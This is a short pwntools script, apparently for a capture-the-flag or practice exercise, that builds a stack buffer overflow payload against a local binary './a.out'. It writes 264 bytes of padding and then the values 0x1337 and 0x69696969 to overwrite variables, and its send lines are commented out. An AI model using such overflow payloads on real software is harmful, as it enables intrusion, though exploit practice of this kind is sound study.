from pwn import *
overwriteme=0x1337
overwritemeAgain=0x69696969
p=process("./a.out")
#p.recvuntil("...")
print(p32(overwriteme))


offset = 272
dist = 8
payload=b"A" * (offset - dist) + p32(overwriteme) + p32(overwritemeAgain)
#p.sendline(payload)
#p.interactive()